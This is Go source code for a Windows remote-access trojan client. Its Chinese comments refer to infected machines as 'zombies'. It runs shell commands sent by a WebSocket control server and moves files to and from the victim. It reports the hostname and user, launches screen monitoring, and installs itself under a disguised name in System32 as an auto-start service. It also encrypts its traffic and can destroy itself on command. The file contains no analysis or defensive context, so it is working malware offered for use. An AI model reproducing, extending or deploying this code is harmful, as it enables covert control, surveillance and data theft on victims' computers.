package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/denisbrodbeck/machineid"
	"github.com/kardianos/service"
	"github.com/xxtea/xxtea-go/xxtea"
	"golang.org/x/net/websocket"
	"golang.org/x/text/encoding/simplifiedchinese"
	"io"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	terrace       = "W"
	SEND_MSG      = "0"   //一般信息，如cmd指令，cmd运行后返回值，提示信息等
	UPLOAD_FILE   = "1"   //上传文件到肉鸡
	DOWNLOAD_FILE = "2"   //下载文件到控制台
	GET_HEART     = "10"  //肉鸡心跳（hostname信息）
	SLEEP_ROUSE   = "50"  //休眠/唤醒肉鸡
	ON_SCREEN     = "70"  //打开监控屏幕
	OFF_SCREEN    = "71"  //关闭监控屏幕
	KILL_ME       = "444" //杀了我

	strKEY = "fhu84ygf8643" //字符串加密key
)

var (
	baseUrl = "127.0.0.1" //"172.16.5.1"
	scName       = "Windows"
	conn         *websocket.Conn
	origin       = "http://" + baseUrl + "/"
	url          = "ws://" + baseUrl + "/hfuiefdhuiwe32uhi"
	errSleepTime = 5
	msgs         = make(chan Message)
	sleepTime    = 0
	hostname     string
	whoami       string
)

type Message struct {
	Uuid      string `json:"uuid"`
	Machineid string `json:"machineid"` //客户端唯一识别码
	Ip        string `json:"ip"`
	Name      string `json:"name"`
	Msg       string `json:"msg"`

	ByteData []byte `json:"byteData"` //截屏,文件，等等大的数据
	FileName string `json:"fileName"`
	//FileBody string `json:"fileBody"`
}

type Host struct {
	Terrace  string `json:"terrace"`
	Hostname string `json:"hostname"`
	Whoami   string `json:"whoami"`
}

func creatWebsocket() (*websocket.Conn, error) {
	return websocket.Dial(url, token(), origin)
}

func begin() {
	signal.Ignore(syscall.Signal(20), syscall.Signal(17), syscall.Signal(18)) //因为代码中没有wait,所以忽略系统子进程结束信号，避免僵尸进程(go1,9没有系统子进程结束信号，自己建造信号值)
	fork()
	var err error
	if !windowsLock() { //互斥锁
		os.Exit(0)
	}
	go outChan() //发送消息
	go heart()   //心跳
	for {
		conn, err = creatWebsocket()
		if err != nil {
			time.Sleep(time.Duration(errSleepTime) * time.Second)
			continue
		}
		//now := time.Now().Format("2006-01-02 15:04:05")
		//发送肉鸡信息到服务器,同时也算做心跳

		for { //接收消息
			//now := time.Now().Format("2006-01-02 15:04:05")
			//fmt.Println(now, "接收消息")
			reqBytes, err := readMessage(conn) //会阻塞，直到收到消息或者报错
			//now = time.Now().Format("2006-01-02 15:04:05")
			//fmt.Println(now, "接收完毕", string(reqBytes), err)
			if err != nil {
				time.Sleep(time.Duration(errSleepTime) * time.Second)
				break
			}
			reqM, err := json2Message(reqBytes)
			if err != nil {
				break
			}
			message := Message{}
			if reqM.Name == SEND_MSG { //执行命令
				message.Name = SEND_MSG
				shellReq, _ := execShell(reqM.Msg) //排除err
				message.Msg = shellReq
				msgs <- message
			} else if reqM.Name == UPLOAD_FILE { //上传文件到肉鸡
				message.Name = SEND_MSG
				file, err := os.Create(reqM.FileName) //创建文件
				if err != nil {
					message.Msg = "upload " + reqM.FileName + " error " + err.Error()
				} else {
					_, err = file.Write(reqM.ByteData) //写入文件
					if err != nil {
						message.Msg = "upload " + reqM.FileName + " error " + err.Error()
					} else {
						message.Msg = "upload " + reqM.FileName + " OK!"
					}
				}
				if file != nil {
					file.Close()
				}
				msgs <- message
			} else if reqM.Name == DOWNLOAD_FILE { //下载文件到控制台
				fileByts, err := ioutil.ReadFile(reqM.Msg) //读取文件
				if err != nil {
					message.Name = SEND_MSG
					message.Msg = "download " + reqM.Msg + " error " + err.Error()
					msgs <- message
				} else if len(fileByts) > 0 {
					message.Name = DOWNLOAD_FILE
					//file64Str := base64.StdEncoding.EncodeToString(fileByts) //base64
					strs := strings.Split(reqM.Msg, "/")
					fileNeme := strs[len(strs)-1]
					message.FileName = fileNeme
					message.ByteData = fileByts
					msgs <- message
				}
			} else if reqM.Name == SLEEP_ROUSE { //设置休眠
				sleepTime, _ = strconv.Atoi(reqM.Msg)
				//fmt.Println("sleepTime:", sleepTime)
				if sleepTime == 0 { //被唤醒
					message.Name = SLEEP_ROUSE
					msgs <- message
				} else {
					conn.Close(); //关闭连接
					break
				}
			} else if reqM.Name == KILL_ME { //自毁
				message.Name = KILL_ME
			kill:
				err := sendMessage(message)
				if err != nil {
					conn.Close()
					conn, _ = creatWebsocket()
					time.Sleep(time.Duration(errSleepTime) * time.Second)
					goto kill
				}
				time.Sleep(time.Duration(errSleepTime) * time.Second)
				conn.Close()
				os.Exit(0)
			} else if reqM.Name == ON_SCREEN { //打开监控屏幕
				//message.Name = ON_SCREEN
				go callScreen(reqM.Msg, baseUrl)
			}
		}
		time.Sleep(time.Duration(sleepTime) * time.Second) //休眠中
	}
}

func callScreen(intervalTime, url string) { //监控屏幕
	StartProcessAsCurrentUser("C:\\Windows\\System32\\System32.exe", "C:\\Windows\\System32\\System32.exe "+intervalTime+" "+url, "C:\\Windows\\System32", true)
}

//func onScreen(message Message, intervalTime int) { //监控屏幕
//	if screenLock == true {
//		return
//	}
//	defer func() { screenLock = false }()
//	screenLock = true
//
//	for {
//		if ScreenFlag == false { //已关闭，需要退出
//			return
//		}
//		img, _ := screenshot.CaptureDisplay(0)
//		var b bytes.Buffer
//		_ = png.Encode(&b, img)
//		file64Str := base64.StdEncoding.EncodeToString(b.Bytes()) //base64
//		message.Msg = file64Str
//		err := sendMessage(message)
//		if err != nil { //连接出错
//			return
//		}
//		time.Sleep(time.Duration(intervalTime) * time.Millisecond) //间隔时间
//	}
//}

//监控屏幕=====================================================================================================

func heart() {
wait:
	if conn == nil {
		time.Sleep(time.Duration(errSleepTime) * time.Second)
		goto wait
	}
	for {
		if sleepTime == 0 {
			message := Message{Name: GET_HEART}

			if hostname == "" {
				hostname, _ = execShell("hostname")
			}
			if whoami == "" {
				whoami, _ = execShell("whoami")
			}
			host := Host{Hostname: hostname, Whoami: whoami, Terrace: terrace}
			hostJsonBytes, _ := json.Marshal(host) //结构体转json
			message.Msg = string(hostJsonBytes)
			//now := time.Now().Format("2006-01-02 15:04:05")
			//fmt.Println(now, "心跳")
			msgs <- message //发送心跳消息
		}
		time.Sleep(25 * time.Second)
	}

}
func outChan() { //发送消息到服务器
wait:
	if conn == nil {
		time.Sleep(time.Duration(errSleepTime) * time.Second)
		goto wait
	}
	for {
		msg := <-msgs
		sendMessage(msg)
	}
}

//读取数据
func readMessage(conn *websocket.Conn) ([]byte, error) {
again:
	fr, err := conn.NewFrameReader()

	if err != nil {
		return nil, err
	}
	frame, err := conn.HandleFrame(fr)
	if err != nil {
		return nil, err
	}
	if frame == nil {
		goto again
	}
	reqBytes, err := ioutil.ReadAll(frame)
	if err != nil {
		return reqBytes, err
	}
	reqBytes = encDec(reqBytes)      //解密数据
	reqBytes = UnGzipBytes(reqBytes) //解压数据
	return reqBytes, nil
}

//发送websocket消息
func sendMessage(message Message) error {
	jsonBytes, _ := json.Marshal(message) //结构体转json
	jsonBytes = gzipBytes(jsonBytes)      //压缩结构体
	jsonBytes = encDec(jsonBytes)         //加密
	if conn != nil {
		_, err := conn.Write(jsonBytes) //发送消息
		return err
	} else {
		return errors.New("conn is null pointer")
	}
}

//gzip压缩
func gzipBytes(byt []byte) []byte {
	var buf bytes.Buffer
	//zw := gzip.NewWriter(&buf)
	zw, _ := gzip.NewWriterLevel(&buf, gzip.BestCompression)

	zw.Write(byt)
	if err := zw.Close(); err != nil {
	}
	return buf.Bytes()
}

//gzip解压缩
func UnGzipBytes(byt []byte) []byte {
	var buf bytes.Buffer
	buf.Write(byt)
	zr, _ := gzip.NewReader(&buf)
	defer func() {
		if zr != nil {
			zr.Close()
		}
	}()
	a, _ := ioutil.ReadAll(zr)
	return a
}
func json2Message(strByte []byte) (Message, error) {
	var dat Message
	if err := json.Unmarshal(strByte, &dat); err == nil {
		return dat, nil
	} else {
		return dat, err
	}
}

//阻塞式的执行外部shell命令的函数,等待执行完毕并返回标准输出
func execShell(s string) (string, error) {
	s = strings.Trim(s, "\n") //去除前后换行
	//cd需要额外处理
	if strings.HasPrefix(s, "cd ") {
		err := os.Chdir(s[3:])
		if err != nil {
			return "", err
		}
		s = "chdir" //切换成pwd返回给控制台
	}

	//函数返回一个*Cmd，用于使用给出的参数执行name指定的程序
	cmd := exec.Command("cmd", "/C", s)
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	if err := cmd.Start(); err != nil {
		return buf.String(), err
	}
	for now := time.Now().Unix(); time.Now().Unix()-now <= 10; { //10秒超时
		if buf.Len() > 0 {
			break
		}
		time.Sleep(500 * time.Millisecond) //500毫秒
	}
	decodeBytes, _ := simplifiedchinese.GB18030.NewDecoder().Bytes(buf.Bytes()) //windows需要特殊转码
	reqStr := string(decodeBytes)
	return reqStr, nil
}
func encDec(byt []byte) []byte {
	for i, v := range byt {
		byt[i] = (byte(i+95) & (^v)) | (v & (^byte(i + 95)))
	}
	return byt
}

//字符串加密
func strDec(str string) string {
	c, _ := xxtea.DecryptString(str, strKEY)
	return c
}

func token() string {
	Unow := time.Now().Unix()
	//mac := getMac()
	//tokenBytes := encDec([]byte(fmt.Sprint(Unow) + "-" + mac)) //当前时间戳+mac地址
	machineid := getMachineid()
	tokenBytes := encDec([]byte(fmt.Sprint(Unow) + "--" + machineid)) //当前时间戳+系统的唯一识别码
	token := base64.StdEncoding.EncodeToString(tokenBytes)
	return token
}

func getMachineid() string { //每个系统的唯一识别码
	machineid, _ := machineid.ID()
	return machineid
}
func getMac() string {
	// 获取本机的MAC地址
	interfaces, _ := net.Interfaces()
	for _, inter := range interfaces {
		//fmt.Println(inter.Name)
		mac := inter.HardwareAddr //获取本机MAC地址
		if fmt.Sprint(mac) != "" {
			return fmt.Sprint(mac)
		}
	}
	return "0"
}

func fork() {
	src, _ := filepath.Abs(filepath.Dir(os.Args[0]))
	dst := "C:\\Windows\\System32\\"
	dstFileName := "Windows.exe"
	if src == dst[:len(dst)-1] { //如果运行程序就在指定目录
		return
	}

	_, err := fileCopy(os.Args[0], dst, dstFileName)
	if err != nil {
		//os.Exit(0)
		return
	} else {
		execShell("sc create Windows binPath= C:/Windows/System32/" + scName + ".exe start= auto displayname= " + scName)
		execShell("sc description " + scName + " " + scName + "")
		execShell("sc start " + scName)
		os.Exit(0) //退自己
	}
}

func fileCopy(src, dst, dstFileName string) (int64, error) {
	_, err := os.Stat(src) //判断文件是否存在
	_, err = os.Stat(dst)  //判断文件是否存在
	if err != nil {
		return 0, err
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()
	destination, err := os.Create(dst + dstFileName)
	if err != nil {
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err
}
func windowsLock() bool {

	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return false
	}
	CreateMutexA, err := kernel32.FindProc("CreateMutexA")
	if err != nil {
		return false
	}
	_, _, lastErr := CreateMutexA.Call(uintptr(0), 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Local\\aaaa"))))
	if lastErr != nil && lastErr.Error() != "The operation completed successfully." {
		return false
	}
	return true
}

type program struct{}

func (p *program) Start(s service.Service) error {
	// Start should not block. Do the actual work async.
	go p.run()
	return nil
}
func (p *program) run() {
	// Do work here
	begin()
}
func (p *program) Stop(s service.Service) error {
	// Stop should not block. Return with a few seconds.
	return nil
}
func main() {
	svcConfig := &service.Config{
		Name:        "GoServiceTest",
		DisplayName: "Go Service Test",
		Description: "This is a test Go service.",
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		return
	}
	err = s.Run()

}
